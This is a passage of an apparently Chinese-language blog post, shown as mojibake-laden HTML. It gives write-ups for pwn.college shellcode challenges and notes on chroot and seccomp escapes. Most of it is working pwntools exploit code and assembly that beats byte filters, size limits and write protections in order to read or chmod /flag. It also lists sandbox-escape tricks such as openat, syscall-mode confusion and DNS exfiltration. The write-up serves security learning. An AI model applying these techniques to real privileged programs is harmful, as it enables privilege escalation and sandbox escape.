class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode).rjust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-é€ ä¸€ä¸ªè·³æ¿"><a href="#4-é€ ä¸€ä¸ªè·³æ¿" class="headerlink" title="4.é€ ä¸€ä¸ªè·³æ¿"></a>4.é€ ä¸€ä¸ªè·³æ¿</h2><blockquote><p>ä½¿ç”¨encodeå‡½æ•°: No encoders for amd64 which can avoid bâ€™Hâ€™</p><p>movçš„ä¸€ç§ç¼–ç ç¬¬ä¸€ä¸ªå­—èŠ‚å°±æ˜¯H, æ‰€ä»¥æ²¡æœ‰åŠæ³•.</p><p>åªèƒ½ä½¿ç”¨å…ˆreadå†jmpçš„æ–¹æ³•.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># é€šè¿‡æµ‹è¯•ç¨‹åºçš„æ‰“å°åŠŸèƒ½æŸ¥åˆ°readç¼–ç 0xfå­—èŠ‚, æ‰€ä»¥ä¸ç”¨jmpç›´æ¥æ¥åœ¨åé¢</span><br>shellcode = shellcraft.amd64.read(<span class="hljs-number">0</span>, addr+<span class="hljs-number">0xf</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.sendline(payload)<br>p.recv() <span class="hljs-comment"># æ— å…³ç´§è¦</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>payload = asm(shellcode)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="5-ç¦ç”¨syscallç³»åˆ—"><a href="#5-ç¦ç”¨syscallç³»åˆ—" class="headerlink" title="5.ç¦ç”¨syscallç³»åˆ—"></a>5.ç¦ç”¨syscallç³»åˆ—</h2><blockquote><p>å•Šè¿™, æˆ‘è¿™â€¦â€¦. æŠ˜è…¾äº†åŠå¤©é‡æ–°çœ‹äº†çœ‹è¯¾ä»¶ç»ˆäºçŸ¥é“ä»–è¦è€ƒæˆ‘ä»€ä¹ˆäº†.</p></blockquote><p>è¿˜å¯ä»¥ç”¨<code>mov byte ptr [rip + s01], 0x0f</code>è¿™æ ·çš„æ¥æ”¹å˜shellcodeæœ¬èº«. ä¾æ®åœ¨äºå°†0f05ä¸¤ä¸ªå­—èŠ‚åˆ†å¼€æ¥.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov byte ptr [rip+syscall1], 0x0f<br>mov byte ptr [rip+syscall2], 0x05<br></code></pre></div></td></tr></table></figure><p>exploit:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary    <span class="hljs-comment"># ä¾‹è¡Œè§£å†³arché—®é¢˜</span><br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment"># dec BYTE PTR [rip+1]</span><br><span class="hljs-comment"># b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span><br>payload = asm(shellcode)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-comment"># len = len(payload)</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(payload):<br>    <span class="hljs-keyword">if</span> payload[i]==<span class="hljs-number">0x0f</span> <span class="hljs-keyword">and</span> payload[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0x05</span>:<br>        <span class="hljs-comment"># å‘ç°syscallçš„0x0f05çš„æ—¶å€™æ¢æˆä¸€æ¡decæŒ‡ä»¤+0x0f06, æ³¨æ„åˆ°opcodeå·²ç»æ¢æˆäº†0x0f06</span><br>        <span class="hljs-comment"># å³CLTS(Clear Task-Switched Flag in CR0)æŒ‡ä»¤.</span><br>        <span class="hljs-comment"># å¦‚æœæ•´ä¸ª0f04ä¸å­˜åœ¨çš„æŒ‡ä»¤ä¹Ÿè¡Œ, ä¸ä¼šå¼•èµ·åæ±‡ç¼–å‡ºç°SIGSEGV</span><br>        payload = payload[:i] + <span class="hljs-string">b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x0f\x06&#x27;</span> + payload[i+<span class="hljs-number">2</span>:]<br>        i+=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        i+=<span class="hljs-number">1</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>6.åŒä¸Š, é™åˆ¶å‰0x1000å†™å…¥æƒé™, æ€»å…±å¯å†™å…¥0x2000</p><blockquote><p>åªè¦readçš„bufåœ¨å4096å­—èŠ‚, ç„¶å<code>payload = payload.rjust(0x1500, b&#39;\x90&#39;)</code>å³å¯.</p><p>å±…ç„¶æ ½åœ¨rjustè¿™ä¸ªå‡½æ•°ä¸Š: ç¬¬ä¸€æ¬¡ä»¥ä¸ºrjustç›´æ¥ä¿®æ”¹bytes, ä½†å‘ç°æ˜¯ä¸ªä¸å¯ä¿®æ”¹çš„class, ç„¶åå‘ç°widthæ˜¯æŒ‡ä¿®æ”¹å®Œåçš„é•¿åº¦è€Œä¸æ˜¯ç›´æ¥åœ¨å·¦è¾¹å¡«å……å¤šå°‘fillcharâ€¦</p></blockquote><h2 id="7-å…³é—­stdio"><a href="#7-å…³é—­stdio" class="headerlink" title="7.å…³é—­stdio"></a>7.å…³é—­stdio</h2><blockquote><p>ç…§ç€è¯¾ä»¶çš„è¯´æ³•æ˜¯æ¯æ¬¡è¿”å›1bitéƒ½èƒ½communicateâ€¦â€¦.</p><p>ä¸è¿‡ç›´æ¥æ‰“å¼€å¦å¤–ä¸€ä¸ªæ–‡ä»¶å°±è¡Œäº†. å±…ç„¶æ ½åœ¨open syscallçš„o_flagä¸Š, åº”è¯¥ç»™ä¸ªO_WRONLYæˆ–è€…O_RDWR.</p><p>shellcraftçš„openå‡½æ•°èƒ½æ¥å—intçš„o_flagæˆ–è€…å­—ç¬¦ä¸²ç±»å‹çš„flag. åªæ”¯æŒå¤§å†™(è¿™ä¸æ˜¯å½“ç„¶ä¹ˆ, æ±‡ç¼–å™¨åªæ”¯æŒè¿™ç§å®å®šä¹‰).</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#æ‰“å¼€æ–‡ä»¶, raxå­˜å‚¨fd, ä»æ–‡ä»¶ä¸­è¯»å–åˆ°å†…å­˜ä¸­addr+0x100, ç„¶åå†™åˆ°stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/res&quot;</span>, <span class="hljs-number">1</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br></code></pre></div></td></tr></table></figure><h2 id="8-é™åˆ¶å†™æƒé™"><a href="#8-é™åˆ¶å†™æƒé™" class="headerlink" title="8.é™åˆ¶å†™æƒé™"></a>8.é™åˆ¶å†™æƒé™</h2><blockquote><p>è€Œä¸”ç¬¬ä¸€æ¬¡åªæœ‰0x12(18)å­—èŠ‚çš„æ±‡ç¼–å­—èŠ‚å¯ä»¥è¾“å…¥. åé¢çš„å­—èŠ‚ä½¿ç”¨äº† <code>mprotect(shellcode_mem,Â 4096,Â PROT_READ|PROT_EXEC)</code>æ¥é™åˆ¶å†æ¬¡write.</p></blockquote><p>emmmmmmâ€¦â€¦â€¦.</p><p>tips:</p><blockquote><p>In fact these are a lot of bytes. Try different <strong>sys calls</strong>. There are other ways to read a flag as well</p><p>Search for a syscall that takes minimal argument so as to decrease size</p></blockquote><p><a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">syscalls man7</a> </p><p>æ‰¾äº†åŠå¤©, åªæœ‰ä¸ªchmodèƒ½ç”¨, å±…ç„¶åˆšå¥½18å­—èŠ‚, çœŸç»å•Š. ä¸€å¼€å§‹æƒ³ç€è¯»å–æ–‡ä»¶è‚¯å®šæ˜¯åšä¸åˆ°çš„, å› ä¸ºåªèƒ½å†™åˆ°bufferä¸Š, å¡ä¸ä¸‹æ›´å¤šçš„é€»è¾‘äº†.  18ä¸ªå­—èŠ‚çœŸçš„å¤ªå°‘, åªèƒ½æ¢ä¸€ä¸ªæ–¹å‘è€Œå»æ”¹å˜ä»–çš„æƒé™, ç„¶åå°±å¯ä»¥ä»»æ„è¯»å–äº†.</p><p>ä¸ºäº†å°½é‡èŠ‚çœç©ºé—´, <code>&#39;/flag&#39;</code>æ”¾åœ¨äº†bytesçš„æœ€å, ç”±èµ·å§‹åœ°å€addrè®¡ç®—å‡º<code>/</code>çš„ä½ç½®, å–ä»£s1ä¸­9æ‰€åœ¨ä½ç½®.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    mov edi, 9</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pos = s1.find(<span class="hljs-string">&#x27;9&#x27;</span>)<br>s1 = s1[:pos] + <span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">12</span>) + s1[pos+<span class="hljs-number">1</span>:]<br>temp = asm(s1)<br>payload = payload + <span class="hljs-string">b&#x27;/flag&#x27;</span><br></code></pre></div></td></tr></table></figure><blockquote><p>ä¸ä¸€å®šè¦ç”¨è¿™ç§æ›¿æ¢, å¯ä»¥ä½¿ç”¨<code>leaÂ rdi,Â [rip+0x??]</code> , æˆ–è€…ä¸‹é¢è¿™ä¸ªchownç³»ç»Ÿè°ƒç”¨.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+0xf]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure></blockquote><p>13.åŒä¸Š, è€Œä¸”å˜æˆ0xcå­—èŠ‚, çœ‹æ¥åªèƒ½chownæˆ–è€…chmodäº†, è¿™é‡Œç”¨chmod.</p><ul><li><p>?????å¥½å§åº”è¯¥pushåˆ°æ ˆä¸Š, ç„¶åå†mov rsp, è¿™æ ·å­æ‰èƒ½å¤§å¹…åº¦åœ°å‡å°‘å­—èŠ‚é•¿åº¦.</p><p>è€Œä¸”ç”±äºæ˜¯å°ç«¯æ³•å­˜å‚¨, è‡ªç„¶åœ°å°±æœ‰7ä¸ªç©ºå­—ç¬¦åœ¨0x66åé¢.<br>gdbä¸€çœ‹raxæ˜¯putå‡½æ•°çš„è¿”å›å€¼, ç›´æ¥å°±æ˜¯0. è¿™ç‚¹æŒºé‡è¦: <strong>åˆ©ç”¨å¯é¢„æµ‹çš„å¯„å­˜å™¨çš„å€¼</strong> </p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">push byte ptr &#x27;f&#x27;    ;6a 66 <br>mov rdi, rsp;48 89 e7<br>mov sil, 0x04;40 b6 04<br>mov al, 0x5a;b0 5a <br>syscall    ;0f 05 é•¿åº¦ä¸º0xb  <br></code></pre></div></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ¡ˆæ˜¯execv, å»æ‰§è¡Œshell, ä¸è¿‡æ–‡ä»¶å¼€å¤´è¦è¿™ä¹ˆå†™<code>#!/bin/sh -p</code>, -pæ˜¯é˜²æ­¢é»˜è®¤çš„é‡ç½®SUIDæ“ä½œ. shellé‡Œé¢ç›´æ¥å†™<code>cat /flag</code>å°±æˆäº†</p><h2 id="9-è¢«åŠ¨ä¿®æ”¹"><a href="#9-è¢«åŠ¨ä¿®æ”¹" class="headerlink" title="9.è¢«åŠ¨ä¿®æ”¹"></a>9.è¢«åŠ¨ä¿®æ”¹</h2><blockquote><p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    lea edi, [rip+0x22]</span><br><span class="hljs-string">    jmp done</span><br><span class="hljs-string">    .space 12</span><br><span class="hljs-string">done:</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    .skip 13</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(s1) + <span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-sort-ur-shellcode"><a href="#10-sort-ur-shellcode" class="headerlink" title="10.sort ur shellcode"></a>10.sort ur shellcode</h2><blockquote><p>æ¯8ä¸ªå­—èŠ‚ä½œä¸ºä¸€ä¸ª64ä½æ— ç¬¦å·æ•°, ä½¿ç”¨å†’æ³¡æ’åºå‡åºæ’åˆ—. emmmmmmâ€¦â€¦</p></blockquote><p>éå¸¸åˆšå¥½çš„æ¯8å­—èŠ‚ä»å°åˆ°å¤§æ’åº, ä¸»è¦çš„æ€æƒ³å°±æ˜¯ä»£ç å°½é‡å°‘, æ‰“å¼€æ–‡ä»¶å’Œè¯»å†™æ”¾åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¸­(cå†™çš„è¯»æ–‡ä»¶), execveä¼šç»§æ‰¿çˆ¶è¿›ç¨‹æƒé™.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#   0:   68 2e 2f 61 00          push   0x612f2e</span><br><span class="hljs-comment">#   5:   48 89 e7                mov    rdi, rsp</span><br><span class="hljs-comment">#   8:   31 d2                   xor    edx, edx</span><br><span class="hljs-comment">#   a:   31 f6                   xor    esi, esi</span><br><span class="hljs-comment">#   c:   6a 3b                   push   0x3b</span><br><span class="hljs-comment">#   e:   58                      pop    rax</span><br><span class="hljs-comment">#   f:   0f 05                   syscall</span><br></code></pre></div></td></tr></table></figure><p>11.åŒä¸Š, å…³é—­stdin</p><blockquote><p>ä¸Šä¸€é¢˜ä»ç„¶ç»§ç»­ç”¨.</p></blockquote><h2 id="12-æ¯ä¸ªbyteå¾—unique"><a href="#12-æ¯ä¸ªbyteå¾—unique" class="headerlink" title="12.æ¯ä¸ªbyteå¾—unique"></a>12.æ¯ä¸ªbyteå¾—unique</h2><blockquote><p><code>ascii_values = [ord(character) for character in text]</code>pythonå­—ç¬¦ä¸²=&gt;ASCII</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    lea edx, [esi] /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>å‡ºä¹æ„æ–™çš„ç®€å•, åªè¦æŠŠç¬¬äºŒä¸ªxoræ”¹æˆleaæŒ‡ä»¤å»æ¸…ç©ºedxå°±å¯ä»¥äº†. ä¸€å¼€å§‹æ”¹çš„movè¿˜ä¸è¡Œ.</p><h2 id="14-åªè¯»6ä¸ªå­—èŠ‚"><a href="#14-åªè¯»6ä¸ªå­—èŠ‚" class="headerlink" title="14.åªè¯»6ä¸ªå­—èŠ‚"></a>14.åªè¯»6ä¸ªå­—èŠ‚</h2><blockquote><p>å¥½åƒåªèƒ½2-stage shellcode, emmmmmmmmâ€¦â€¦.</p></blockquote><p>ä»ç„¶æ˜¯åˆ©ç”¨äº†raxç­‰äº0, rdxæ˜¯shellmemåœ°å€, ä¹Ÿå¯ä»¥å½“åšæ˜¯è¦è¯»å–çš„å­—èŠ‚æ•°ä½¿ç”¨readå‡½æ•°çš„è¯åªæœ‰rsi(ç¬¬äºŒä¸ªå‚æ•°)éœ€è¦æ”¹ä¸ºrdxä¸Šçš„åœ°å€, ç®€å•movå°±å¯ä»¥äº†. ç„¶åç¬¬äºŒé˜¶æ®µéšä¾¿æ•´.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov esi, edx</span><br><span class="hljs-string">syscall//call read(0, 0x14e40000, 0x14e40000)</span><br><span class="hljs-string">//2-stage shellcode</span><br><span class="hljs-string">.space 6, 0x90</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br>shellcode += shellcraft.amd64.write(<span class="hljs-number">1</span>,    <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure><h1 id="module-5-jail"><a href="#module-5-jail" class="headerlink" title="module 5-jail"></a>module 5-jail</h1><ul><li><p>chroot(â€œ/tmp/jailâ€)</p><ul><li><p>chroot(â€œ/tmp/jailâ€) does NOT:</p><p>Close resources that reside outside of the jail.<br>cd (chdir()) into the jail.<br>Do anything else!</p></li><li><p>you can use open<strong>at</strong> and execve<strong>at</strong>: <code>int openat(**int dirfd**, char *pathname, int flags);</code></p><p>è¿™ä¸¤ä¸ªå‡½æ•°çš„pathå¦‚æœæ˜¯ç»å¯¹è·¯å¾„, é‚£ä¹ˆdirfdå°±ä¼šè¢«å¿½ç•¥;<br>å¦‚æœpathæ˜¯ç›¸å¯¹è·¯å¾„, è€Œä¸”dirfdæ˜¯åˆæ³•çš„, é‚£ä¹ˆpathæ‰€å¼•ç”¨çš„å°±æ˜¯dirfdæ‰€è¡¨ç¤ºçš„è·¯å¾„.</p></li><li><p>å¦‚æœå†æ¬¡chrootä¼šå‘ç”Ÿä»€ä¹ˆ? kernelå¯¹æ­¤æ˜¯å®Œå…¨ä¸çŸ¥æƒ…çš„.</p></li><li><p>Generally, a user with an effective ID of 0 (i.e., a process run as root or SUIDed to root) can <em><strong>always</strong></em> break out of a chroot, unless the chroot syscall is blocked!</p></li><li><p>Also missing other forms of isolation: <strong>PID, network, IPC</strong> </p></li><li><p>Replacements: <strong>cgroups, namespaces, seccomp</strong> </p></li></ul></li><li><p>seccomp: </p><ul><li><code>gcc -o test test.c -lseccomp</code> <code>seccomp-tools dump ./test</code> </li><li>åŸç†æ˜¯eBPF, seccompå°±æ˜¯ä½¿ç”¨çš„eBPFæ¥å®ç°çš„, è¿˜å¯ä»¥ç”¨æ¥å®ç°ä¸€ç³»åˆ—system trace <a href="https://github.com/iovisor/bcc">tools</a> </li></ul></li><li><p>break out seccomp: Generally, to do anything useful, a sandboxed process needs to be able to communicate with the privileged process. æœ‰ä¸¤ç‚¹å¯èƒ½, ç¬¬ä¸€æ˜¯syscallå¾ˆå¤š, æœ‰äº›å¯èƒ½å¯ä»¥è¢«åˆ©ç”¨, ç¬¬äºŒæ˜¯å¼€å‘è€…å¯èƒ½ä¸ºäº†ä¸ç ´ååŠŸèƒ½è€Œåœ¨æƒé™æ–¹é¢çŠ¯é”™è¯¯.</p><ul><li><strong>permissive policies</strong>: ptrace() sendmsg() prctl() process_vm_writev()</li><li><strong>syscall confusion:</strong> on some systems, you can switch between 32-bit mode with 64-bit mode <em>in the same process</em>, and the syscall numbers are different between architectures. æ¯”å¦‚è¯´ç³»ç»Ÿè°ƒç”¨åˆ†åˆ«æ˜¯<code>int 0x80 and syscall</code>(<code>\xcd\x80 and \x0f\x05</code>), ç³»ç»Ÿè°ƒç”¨å·ä¹Ÿä¸åŒ.</li><li><strong>kernel vulnerabilities</strong> in the syscall handlers: Over 30 chrome sandbox escapes in 2019 <a href="https://github.com/allpaca/chrome-sbx-db">link</a> </li><li>data exfiltration: such as sleep(), exit(), normal or crash. Or use DNS queries to bypass network egress filters.</li></ul></li></ul><blockquote><p>Redirectionså¾ˆé‡è¦. <a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">link</a> </p></blockquote><p>è¡¥å……:</p><ul><li>å®é™…æµ‹è¯•ä¸­åœ¨shellé‡Œé¢ç›´æ¥ä½¿ç”¨chrootå‘½ä»¤å¹¶ä¸ä¼šå‘ç”Ÿescape, åªèƒ½åœ¨cä»£ç ä¸­ä½¿ç”¨chrootåº“å‡½æ•°. çŒœæµ‹å¯èƒ½æ˜¯å› ä¸ºchrootçš„å‘½ä»¤è¡Œå¯¹ç³»ç»Ÿè°ƒç”¨è¿›è¡Œäº†ä¸€å±‚å°è£…, åŠ ä¸Šäº†è·³è½¬åˆ°jailé‡Œé¢çš„ç›®å½•ä¸­; è€Œlibcåº“ä¸­åªæ˜¯å•çº¯çš„ç³»ç»Ÿè°ƒç”¨, å¹¶æ²¡æœ‰chdirè¿™ä¸ªæ­¥éª¤.</li><li>å¥½å‡ ä¸ªå‡½æ•°éƒ½æœ‰<code>at</code>çš„ç‰ˆæœ¬, chmod-&gt;fchmodat, open-&gt;openat(openåªæ˜¯libcä¸­å¯¹openatçš„å°è£…) and so forth.</li><li></li></ul><h3 id="1-exemplify"><a href="#1-exemplify" class="headerlink" 